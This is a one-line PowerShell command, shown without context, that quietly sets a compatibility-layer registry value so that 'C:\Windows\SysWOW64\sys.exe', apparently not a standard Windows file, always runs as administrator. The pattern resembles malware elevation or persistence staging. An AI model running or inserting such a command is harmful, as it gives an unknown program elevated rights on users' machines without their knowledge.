New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" -Name C:\Windows\SysWOW64\sys.exe -Value RUNASADMIN -PropertyType string -Force | Out-Null
